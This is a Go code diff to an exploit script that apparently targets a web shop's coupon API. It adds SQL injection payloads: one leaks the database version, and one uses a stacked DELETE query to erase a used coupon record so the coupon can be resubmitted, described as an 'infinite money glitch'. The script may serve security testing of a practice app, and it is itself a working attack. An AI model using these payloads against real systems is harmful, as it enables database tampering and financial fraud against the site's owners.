@@ -25,16 +25,24 @@ func main() {
 		log.Fatalln("token empty")
 	}
 
-	fmt.Println("Database leaks through SQL Injection vulnerability!")
-	SQLInjection(config.TargetURL, token)
+	leakPayload := "0'; select version() --+"
+	sqliPayload := "TRAC075'; DELETE FROM applied_coupon WHERE coupon_code='TRAC075';--"
+	submitCouponPayload := "TRAC075"
 
+	fmt.Println("Database leaks through SQL Injection vulnerability:")
+	SubmitCoupon(config.TargetURL, token, leakPayload)
+	fmt.Println("Removing used coupon from DB")
+	SubmitCoupon(config.TargetURL, token, sqliPayload)
+	fmt.Println("Submitting it again")
+	SubmitCoupon(config.TargetURL, token, submitCouponPayload)
+	fmt.Println("Infinite money glitch!!")
 }
 
-func SQLInjection(tageturl, token string) {
+func SubmitCoupon(tageturl, token, payloadString string) {
 	client := configurator.CustomHttpClient()
 
 	payload := map[string]interface{}{
-		"coupon_code": "0'; select version() --+",
+		"coupon_code": payloadString,
 		"amount":      75,
 	}
 
